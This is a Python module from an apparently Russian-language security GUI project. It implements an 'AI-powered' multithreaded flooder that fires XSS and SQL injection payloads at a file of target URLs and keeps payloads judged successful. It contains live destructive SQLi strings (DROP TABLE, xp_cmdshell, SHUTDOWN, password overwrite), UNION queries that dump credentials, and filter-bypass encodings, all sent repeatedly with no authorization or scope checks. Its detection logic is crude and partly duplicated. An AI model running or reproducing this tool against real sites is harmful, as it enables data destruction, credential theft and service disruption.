# xss_security_gui/auto_recon/xss_flooder.py
"""
XSS Flooder ULTRA 6.1 — многопоточный движок с AI интеграцией
--------------------------------------------
Особенности:
- Worker-потоки (постоянные)
- Очередь задач (Queue)
- Rate limiting
- Callback для GUI
- Логи в logs/xss_flood_log.txt (с расширенным содержимым)
- Интеграция с settings.py и ThreatConnector
- Поддержка XSS, SQLi (stacked, union, boolean, time-based)
- AI обучение на успешных атаках
- Генерация новых payloads с помощью AI
"""

import time
import queue
import threading
import requests
from datetime import datetime
from pathlib import Path
from typing import Callable, Iterable, Optional, Dict, Any, List
import random
import json

from xss_security_gui.settings import LOG_DIR, BASE_DIR, settings
from xss_security_gui.threat_analysis.threat_connector import THREAT_CONNECTOR

# AI Core интеграция
from xss_security_gui.ai_core.synthetic_xss import generate_synthetic_xss
from xss_security_gui.ai_core.llm_client import llm_analyze_js
from xss_security_gui.ai_core.ml_model import ml_risk_score
from xss_security_gui.ai_core.features import build_js_features
from xss_security_gui.js_inspector import extract_js_insights

# Payloads
from xss_security_gui.auto_recon.payloads import XSS_PAYLOADS, FUZZ_PAYLOADS
from xss_security_gui.utils.safe_call import safe_invoke

# 📂 Путь к файлу целей
TARGETS_FILE: Path = BASE_DIR / "auto_recon" / "target" / "targets.txt"

# 📁 Подготовка лог-файла
LOG_PATH: Path = LOG_DIR / "xss_flood_log.txt"
LOG_PATH.parent.mkdir(parents=True, exist_ok=True)

# 📁 Файл для обучения AI
LEARNING_FILE: Path = LOG_DIR / "ai_learning.json"
LEARNING_FILE.parent.mkdir(parents=True, exist_ok=True)

# Тип callback
FloodCallback = Callable[[str, str, str], None]

# 💣 Список целей (загружается из файла)
payload_urls: list[str] = []

# AI обучение данные
ai_learning_data: Dict[str, List[str]] = {
    "successful_xss": [],
    "successful_sqli": [],
    "failed_payloads": []
}

# Загрузка данных обучения
def load_learning_data():
    global ai_learning_data
    if LEARNING_FILE.exists():
        try:
            with LEARNING_FILE.open("r", encoding="utf-8") as f:
                ai_learning_data = json.load(f)
        except Exception as e:
            print(f"[XSSFlooder] Ошибка загрузки данных обучения: {e}")

# Сохранение данных обучения
def save_learning_data():
    try:
        with LEARNING_FILE.open("w", encoding="utf-8") as f:
            json.dump(ai_learning_data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"[XSSFlooder] Ошибка сохранения данных обучения: {e}")

# Инициализация
load_learning_data()

# SQLi payloads для разных типов
SQLI_PAYLOADS = {
    "stacked": [
        "'; DROP TABLE users; --",
        "'; EXEC xp_cmdshell('net user'); --",
        "'; SHUTDOWN; --",
        "'; UPDATE users SET password='hacked'; --"
    ],
    "union": [
        "' UNION SELECT NULL, username, password FROM users --",
        "' UNION SELECT 1,2,3 --",
        "' UNION ALL SELECT database(), user(), version() --",
        "' UNION SELECT table_name FROM information_schema.tables --"
    ],
    "boolean": [
        "' AND 1=1 --",
        "' AND 1=2 --",
        "' OR '1'='1",
        "' AND SLEEP(0) --",
        "' AND 1=0 UNION SELECT 'admin','pass' --"
    ],
    "time": [
        "' AND SLEEP(5) --",
        "' AND IF(1=1, SLEEP(3), 0) --",
        "' WAITFOR DELAY '0:0:5' --",
        "' AND BENCHMARK(1000000, MD5('test')) --"
    ]
}

# Bypass техники
BYPASS_TECHNIQUES = {
    "stacked": [
        ";%00",
        ";#",
        ";-- -",
        ";/*",
        ";%0A",
        ";%0D",
        ";%0D%0A"
    ],
    "union": [
        "/*union*/select",
        "+union+select",
        "union%20select",
        "union/**/select",
        "union%0Aselect",
        "union%0Dselect"
    ],
    "boolean": [
        "and%201=1",
        "or%201=1",
        "and/**/1=1",
        "or/**/1=1",
        "and%0A1=1"
    ],
    "time": [
        "and%20sleep(5)",
        "and/**/sleep(5)",
        "and%0Asleep(5)",
        "waitfor%20delay%20'0:0:5'"
    ]
}

# Генерация AI payloads
def generate_ai_payloads(attack_type: str, num_payloads: int = 10) -> List[str]:
    """Генерирует новые payloads с помощью AI на основе успешных атак."""
    base_payloads = []
    if attack_type == "xss":
        base_payloads = ai_learning_data["successful_xss"][-10:] if ai_learning_data["successful_xss"] else XSS_PAYLOADS[:10]
        # Используем synthetic_xss для генерации
        ai_generated = generate_synthetic_xss(num_payloads)
        return ai_generated + base_payloads
    elif attack_type.startswith("sqli"):
        sqli_type = attack_type.split("_")[1]
        base_payloads = ai_learning_data["successful_sqli"][-10:] if ai_learning_data["successful_sqli"] else SQLI_PAYLOADS.get(sqli_type, [])[:10]
        # Мутация существующих
        mutated = []
        for _ in range(num_payloads):
            base = random.choice(base_payloads)
            technique = random.choice(BYPASS_TECHNIQUES.get(sqli_type, [""]))
            mutated.append(technique + base)
        return mutated + base_payloads
    return []

# Анализ ответа с AI
def analyze_response_with_ai(url: str, response_text: str, payload: str, attack_type: str) -> Dict[str, Any]:
    """Анализирует ответ с помощью AI для определения успеха атаки."""
    analysis = {
        "is_successful": False,
        "risk_score": 0.0,
        "llm_summary": "",
        "ml_score": 0.0
    }

    if attack_type == "xss":
        # Извлекаем JS из ответа
        js_code = extract_js_from_response(response_text)
        if js_code:
            js_insights = extract_js_insights(js_code)
            features = build_js_features(js_insights, js_code)
            analysis["llm_summary"] = llm_analyze_js(js_code, features)["llm_summary"]
            analysis["ml_score"] = ml_risk_score(features)
            analysis["risk_score"] = analysis["ml_score"]
            # Определяем успех по наличию payload в ответе или высоким рискам
            analysis["is_successful"] = payload in response_text or analysis["risk_score"] > 0.7
    elif attack_type.startswith("sqli"):
        # Для SQLi проверяем на ошибки или успешные инъекции
        sqli_indicators = ["mysql", "syntax error", "sql", "database", "table", "column"]
        analysis["is_successful"] = any(indicator in response_text.lower() for indicator in sqli_indicators) or "error" in response_text.lower()
        analysis["risk_score"] = 0.8 if analysis["is_successful"] else 0.1

    return analysis

def extract_js_from_response(response_text: str) -> str:
    """Извлекает JS код из HTML ответа."""
    import re
    js_pattern = r'<script[^>]*>(.*?)</script>'
    matches = re.findall(js_pattern, response_text, re.DOTALL | re.IGNORECASE)
    return ' '.join(matches) if matches else ""

# 📝 Логирование ответа (локальный файл)
def log_response(url: str, status: str, snippet: str, payload: str, attack_type: str, ai_analysis: Dict[str, Any]) -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        with LOG_PATH.open("a", encoding="utf-8") as f:
            f.write(f"[{timestamp}] [{attack_type}] [{status}] {url}\n")
            f.write(f"Payload: {payload}\n")
            f.write(f"Snippet: {snippet[:200]}\n")
            f.write(f"AI Analysis: {json.dumps(ai_analysis, ensure_ascii=False)}\n\n")
    except Exception as e:
        print(f"[XSSFlooder] Ошибка записи лога: {e}")


# 📂 Загрузка целей из файла
def load_targets_from_file(path: Path) -> list[str]:
    """Загружает список целей из файла, игнорируя пустые строки и комментарии (#)."""
    if not path.exists():
        print(f"[XSSFlooder] Файл {path} не найден.")
        return []
    try:
        with path.open(encoding="utf-8") as f:
            return [
                line.strip()
                for line in f
                if line.strip() and not line.strip().startswith("#")
            ]
    except Exception as e:
        print(f"[XSSFlooder] Ошибка чтения файла {path}: {e}")
        return []


# Инициализация списка целей
payload_urls = load_targets_from_file(TARGETS_FILE)


# 🚀 Отправка одного пейлоада (с повтором)
def send_payload(
    url: str,
    payload: str,
    attack_type: str,
    callback: Optional[FloodCallback],
    timeout: int,
    repeat: int,
    delay: float,
) -> None:
    """Отправляет несколько запросов подряд на один URL."""
    for _ in range(repeat):
        try:
            # Для разных типов атак разные методы
            if attack_type.startswith("sqli"):
                # Для SQLi добавляем payload в параметры
                test_url = url + ("?" if "?" not in url else "&") + f"id={payload}"
                response = requests.get(test_url, timeout=timeout)
            else:
                # Для XSS вставляем в URL или параметры
                test_url = url.replace("FUZZ", payload) if "FUZZ" in url else url + payload
                response = requests.get(test_url, timeout=timeout)

            status = str(response.status_code) if response.ok else f"FAIL-{response.status_code}"
            snippet = response.text[:200]

            # AI анализ
            ai_analysis = analyze_response_with_ai(test_url, response.text, payload, attack_type)
            # ============================
            # 🔥 XSS / SQLi детекторы
            # ============================
            try:
                from xss_security_gui.xss_detector import XSSDetector
                from xss_security_gui.sqli_detector import SQLiDetector

                xss_detector = XSSDetector()
                xss_result = xss_detector.detect_xss_context(response.text, payload)

                sqli_detector = SQLiDetector()
                sqli_result = sqli_detector.detect_sqli_context(response.text, payload)

                if xss_result or sqli_result:
                    THREAT_CONNECTOR.add_artifact(
                        module="xss_flooder_detect",
                        target=test_url,
                        result={
                            "payload": payload,
                            "attack_type": attack_type,
                            "xss": xss_result,
                            "sqli": sqli_result,
                            "timestamp": datetime.now().isoformat(),
                        },
                    )
            except Exception as e:
                print(f"[XSSFlooder] Detector error: {e}")

            # ============================
            # 🔥 ThreatEngine анализ
            # ============================
            try:
                from xss_security_gui.threat_analysis.engine_v12 import ThreatEngine
                ThreatEngine.analyze_response(test_url, response.text)
            except Exception as e:
                print(f"[XSSFlooder] ThreatEngine error: {e}")

            # ============================
            # 🔥 XSS / SQLi детекторы
            # ============================
            try:
                from xss_security_gui.xss_detector import XSSDetector
                from xss_security_gui.sqli_detector import SQLiDetector

                xss_result = XSSDetector().detect_xss_context(response.text, payload)

                sqli_result = SQLiDetector().detect_sqli_context(response.text, payload)


                if xss_result or sqli_result:
                    THREAT_CONNECTOR.add_artifact(
                        module="xss_flooder_detect",
                        target=test_url,
                        result={
                            "payload": payload,
                            "attack_type": attack_type,
                            "xss": xss_result,
                            "sqli": sqli_result,
                            "timestamp": datetime.now().isoformat(),
                        },
                    )
            except Exception as e:
                print(f"[XSSFlooder] Detector error: {e}")

            # ============================
            # 🔥 CombatCrawler event push
            # ============================
            try:
                from xss_security_gui.combat_crawler import COMBAT_EVENT_QUEUE
                COMBAT_EVENT_QUEUE.put({
                    "type": "flood_result",
                    "url": test_url,
                    "payload": payload,
                    "attack_type": attack_type,
                    "ai": ai_analysis,
                    "timestamp": datetime.now().isoformat(),
                })
            except Exception as e:
                print(f"[XSSFlooder] Combat event error: {e}")

            # Обучение AI
            if ai_analysis["is_successful"]:
                if attack_type == "xss":
                    ai_learning_data["successful_xss"].append(payload)
                elif attack_type.startswith("sqli"):
                    ai_learning_data["successful_sqli"].append(payload)
                save_learning_data()
            else:
                ai_learning_data["failed_payloads"].append(payload)

            # ThreatConnector интеграция
            THREAT_CONNECTOR.emit(
                module="xss_flooder",
                target=test_url,
                result={
                    "status": status,
                    "snippet": snippet,
                    "payload": payload,
                    "attack_type": attack_type,
                    "ai_analysis": ai_analysis,
                    "error": snippet if status == "ERROR" else None,
                },
            )

            # Callback для GUI (safe: may be bound to Tk widget)
            if callback:
                try:
                    safe_invoke(callback, test_url, status, snippet)
                except Exception:
                    # Swallow to avoid worker crash
                    pass

            # Локальное логирование
            log_response(test_url, status, snippet, payload, attack_type, ai_analysis)

        except Exception as e:
            status = "ERROR"
            snippet = str(e)
            ai_analysis = {"is_successful": False, "risk_score": 0.0, "llm_summary": str(e), "ml_score": 0.0}

            # Callback для GUI (safe)
            if callback:
                try:
                    safe_invoke(callback, url, status, snippet)
                except Exception:
                    pass

            # Локальное логирование
            log_response(url, status, snippet, payload, attack_type, ai_analysis)

        if delay > 0:
            time.sleep(delay)


# 🔁 Worker-поток
def worker_thread(
    task_queue: queue.Queue[tuple[Optional[str], str, str, int, float]],
    callback: Optional[FloodCallback],
    timeout: int,
    running_flag=None,
) -> None:
    while True:
        try:
            url, payload, attack_type, repeat, delay = task_queue.get(timeout=1)

            # Сигнал завершения
            if url is None:
                task_queue.task_done()
                print("[XSSFlooder] Worker завершён.")
                break

            # Безопасная остановка
            if running_flag is not None and not running_flag.is_set():
                print("[XSSFlooder] Worker остановлен пользователем.")
                task_queue.task_done()
                break

            send_payload(
                url=url,
                payload=payload,
                attack_type=attack_type,
                callback=callback,
                timeout=timeout,
                repeat=repeat,
                delay=delay,
            )

            task_queue.task_done()

        except queue.Empty:
            time.sleep(0.1)
        except Exception as e:
            print(f"[XSSFlooder] Ошибка в worker: {e}")



# 🚀 Запуск многопоточного флудера
def start_flood(
    target_urls: Iterable[str] = None,
    attack_types: List[str] = None,
    flood_interval: float = None,
    flood_count: int = None,
    max_workers: Optional[int] = None,
    callback: Optional[FloodCallback] = None,
    timeout: int = None,
    repeat_each: int = None,
    delay_each: float = None,
    use_ai: bool = True,
    running_flag=None,
) -> None:
    # Централизованные настройки
    urls = list(target_urls or payload_urls)
    if not urls:
        print(f"[XSSFlooder] Нет целевых URL. Проверь файл {TARGETS_FILE}")
        return

    attack_types = attack_types or ["xss"]
    flood_interval = flood_interval or settings.get("flood.interval", 1.0)
    flood_count = flood_count or settings.get("flood.cycles", 1)
    max_workers = max_workers or settings.get("attack_engine.threads", 6)
    timeout = timeout or settings.get("flood.timeout", 2)
    repeat_each = repeat_each or settings.get("flood.repeat_each", 10)
    delay_each = delay_each or settings.get("flood.delay_each", 0.0)

    total_requests = len(urls) * len(attack_types) * repeat_each * flood_count
    print(
        f"[XSSFlooder] Starting AI-powered flood: {len(urls)} URLs, "
        f"types={attack_types}, cycles={flood_count}, workers={max_workers}, "
        f"total_requests={total_requests}"
    )

    task_queue: queue.Queue[tuple[Optional[str], str, str, int, float]] = queue.Queue()

    # Создаём worker-потоки
    workers = []
    for _ in range(max_workers):
        t = threading.Thread(
            target=worker_thread,
            args=(task_queue, callback, timeout, running_flag),
            daemon=True,
        )
        t.start()
        workers.append(t)

    # Основной цикл
    for cycle in range(flood_count):
        print(f"[XSSFlooder] Cycle {cycle + 1}/{flood_count}")

        # Безопасная остановка
        if running_flag is not None and not running_flag.is_set():
            print("[XSSFlooder] Flood остановлен пользователем.")
            break

        for attack_type in attack_types:
            # Генерация payloads с AI
            if use_ai:
                payloads = generate_ai_payloads(attack_type, num_payloads=20)
            else:
                if attack_type == "xss":
                    payloads = XSS_PAYLOADS[:20]
                elif attack_type.startswith("sqli"):
                    sqli_type = attack_type.split("_")[1]
                    payloads = SQLI_PAYLOADS.get(sqli_type, [])[:20]
                else:
                    payloads = FUZZ_PAYLOADS[:20]

            for url in urls:
                for payload in payloads:
                    # Безопасная остановка
                    if running_flag is not None and not running_flag.is_set():
                        print("[XSSFlooder] Flood остановлен пользователем.")
                        break

                    task_queue.put((url, payload, attack_type, repeat_each, delay_each))

        task_queue.join()

        if cycle < flood_count - 1:
            time.sleep(flood_interval)

    # Завершаем worker-потоки
    for _ in workers:
        task_queue.put((None, "", "", 0, 0))

    for t in workers:
        t.join()

    print("[XSSFlooder] AI-powered flood complete. Learning data updated.")

